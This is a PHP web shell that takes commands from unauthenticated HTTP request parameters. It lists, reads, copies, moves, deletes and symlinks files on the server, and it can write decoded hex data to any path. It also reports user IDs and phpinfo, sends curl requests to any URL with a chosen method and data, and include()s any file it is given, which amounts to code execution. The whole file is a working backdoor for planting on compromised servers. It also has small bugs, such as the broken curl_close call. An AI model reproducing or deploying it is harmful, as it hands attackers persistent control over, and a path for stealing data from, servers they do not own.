<?php
    function perms($path) {
        $permissions = substr(sprintf("%o", fileperms($path)), -3);
        $u_perms = "" . sprintf("%b", $permissions[0]);
        $g_perms = "" . sprintf("%b", $permissions[1]);
        $o_perms = "" . sprintf("%b", $permissions[2]);
        $perms = "";
        foreach([$u_perms, $g_perms, $o_perms] as $p) {
            $perms .= $p[0] ? "r" : "-";
            $perms .= $p[1] ? "w" : "-";
            $perms .= $p[2] ? "x" : "-";
        }
        return $perms;
    }

    function fileinfo($path, $basic) {
        $user  = $basic ? fileowner($path) : posix_getpwuid(fileowner($path))["name"];
        $group = $basic ? filegroup($path) : posix_getgrgid(filegroup($path))["name"];
        $type = filetype($path)[0];

        $info  = $type === 'f' ? '-' : $type;
        $info .= perms($path);
        $info .= "\t" . $user;
        $info .= "\t" . $group;
        $info .= "\t" . filesize($path);
        $info .= "\t" . date("Y-m-d H:i:s", filemtime($path));
        $info .= "\t" . basename($path);
        $info .= $type === 'l' ? " -> " . readlink($path) : "";
        $info .= "\n";
        return $info;
    }

    /*
     * Checks to implement:
     * - non-negative line numbers
     * - $line_end < $line_ini
     * - $line_end > len($path)
     */
    function sed($path, $ini, $end) {
        $file = fopen($path, 'r');
        // Skipping unwanted lines
        for ($i=1; $i<$ini; $i++) {
            fgets($file);
        }
        // Reading and storing wanted lines
        $lines = '';
        for ($i=$ini; $i<=$end; $i++) {
            $lines .= fgets($file);
        }
        fclose($file);
        return $lines;
    }

    // Display errors and warnings if specified
    if(!isset($_REQUEST['error'])) {
        error_reporting(E_ERROR | E_PARSE);
    }

    $basic = isset($_REQUEST['basic'])? 1: 0;  // Older versions do not support POSIX functions
    $contents = "";
    if (isset($_REQUEST['info'])) {
        phpinfo();
        die();
    } elseif (isset($_REQUEST['date'])) {
        $contents .= date("Y-m-d H:i:s");
    } elseif (isset($_REQUEST['pwd'])) {
        $contents .= getcwd();
    } elseif (isset($_REQUEST['whoami'])) {
        // This returns the owner of the current script running
        $contents .= get_current_user();
    } elseif (isset($_REQUEST['id'])) {
        // This returns the information of the current script running
        $uid = getmyuid();
        $gid = getmygid();
        if (!$basic) {
            $user = posix_getpwuid($uid)["name"];
            $group = posix_getgrgid($gid)["name"];
            $contents .= "uid={$uid}({$user}) gid={$gid}({$group})";
        } else {
            $contents .= "uid={$uid} gid={$gid}";
        }
    } elseif (isset($_REQUEST['file'])) {
        $contents .= filetype($_REQUEST['file']);
    } elseif (isset($_REQUEST['du'])) {
        $contents .= filesize($_REQUEST['du']);
    } elseif (isset($_REQUEST['realpath'])) {
        $contents .= realpath($_REQUEST['realpath']);
    } elseif (isset($_REQUEST['cp'])) {
        if (!isset($_REQUEST['to'])) {
            die("Parameter 'to' missing.");
        }
        $contents .= copy($_REQUEST['cp'], $_REQUEST['to']) ? "success" : "fail";  // 0 is false and success
    } elseif (isset($_REQUEST['mv'])) {
        if (!isset($_REQUEST['to'])) {
            die("Parameter 'to' missing.");
        }
        $contents .= rename($_REQUEST['mv'], $_REQUEST['to']) ? "success" : "fail";  // 0 is false and success
    } elseif (isset($_REQUEST['rm'])) {
        $contents .= unlink($_REQUEST['rm']) ? "success" : "fail";  // 0 is false and success
    } elseif (isset($_REQUEST['mkdir'])) {
        $contents .= mkdir($_REQUEST['mkdir']) ? "success" : "fail";  // 0 is false and success
    } elseif (isset($_REQUEST['rmdir'])) {
        $contents .= rmdir($_REQUEST['rmdir']) ? "success" : "fail";  // 0 is false and success
    } elseif (isset($_REQUEST['ls'])) {
        $dir = $_REQUEST['ls'] ? realpath($_REQUEST['ls']) : '.';
        foreach(scandir($dir) as $f) {
            // to list directories in other paths it is necessary to provide the real path
            $contents .= fileinfo($dir ."/". $f, $basic);
            //$contents .= "\t{$f}\n";
        }
    } elseif (isset($_REQUEST['cat'])) {
        $file = $_REQUEST['cat'];
        $contents .= file_get_contents($file);
    } elseif (isset($_REQUEST['ln'])) {
        $file = $_REQUEST['ln'];
        if (!isset($_REQUEST['to'])) {
            die("Parameter 'to' missing.");
        }
        $contents .= symlink($file, $_REQUEST['to']) ? "success" : "fail";  // 0 is false and success
    } elseif (isset($_REQUEST['sed'])) {
        if (isset($_REQUEST['l0'])) {
            $file = $_REQUEST['sed'];
            if (isset($_REQUEST['lend'])) {
                $contents .= sed($file, $_REQUEST['l0'], $_REQUEST['l1']);
            } else {
                $contents .= sed($file, $_REQUEST['l0'], $_REQUEST['l1']);
            }
        } else {
            die("Missing 'l0' ('l1') parameter");
        }
    } elseif (isset($_REQUEST['curl'])) {
        if (function_exists('curl_version')) {
            if (isset($_REQUEST['output'])) {
                $handler = curl_init();
                curl_setopt_array($handler, [
                    CURLOPT_URL => $_REQUEST['curl'],
                    CURLOPT_CUSTOMREQUEST => isset($_REQUEST['method'])? $_REQUEST['method'] : "GET",
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_POSTFIELDS => isset($_REQUEST['data'])? $_REQUEST['data'] : '',
                ]);
                $contents .= curl_exec($handler);
                $curl_close($handler);
            } else {
                die("Missing 'output' parameter");
            }
        } else {
            die("cURL is not enabled");
        }
    } elseif (isset($_REQUEST['base64'])) {
        $file = $_REQUEST['base64'];
        $file_contents = file_get_contents($file);
        if (isset($_REQUEST['decode'])) {
            $contents .= base64_decode($file_contents);
        } else {
            $contents .= base64_encode($file_contents);
        }
    } elseif (isset($_REQUEST['xxd'])) {
        $file = $_REQUEST['xxd'];
        $file_contents = file_get_contents($file);
        if (isset($_REQUEST['decode'])) {
            if (isset($_REQUEST['to'])) {
                $contents .= file_put_contents($_REQUEST['to'], hex2bin($file_contents)) ? "success" : "fail";
            } else {
                die("Missing 'to' parameter");
            }
        } else {
            $contents .= bin2hex($file_contents);
        }
    } elseif (isset($_REQUEST['wc'])) {
        $file = $_REQUEST['wc'];
        $lines = count(file($file));
        $characters = filesize($file);
        // Words are harder
        $string = trim(preg_replace('/\s+/', ' ', file_get_contents($file)));
        $words = count(explode(" ", $string));
        $contents .= $lines . " " . $words . " " . $characters . " " . $file;
    } elseif (isset($_REQUEST['md5sum'])) {
        $file = $_REQUEST['md5sum'];
        $contents .= md5_file($file) . "  " . $file;
    } elseif (isset($_REQUEST['sha1sum'])) {
        $file = $_REQUEST['sha1sum'];
        $contents .= sha1_file($file) . "  " . $file;
    } elseif (isset($_REQUEST['include'])) {
        include($_REQUEST['include']);
        die();
    }

    // Result
    if (isset($_REQUEST["web"])) {
        echo "<pre>{$contents}</pre>";
    } else {
        echo "{$contents}";
    }
?>
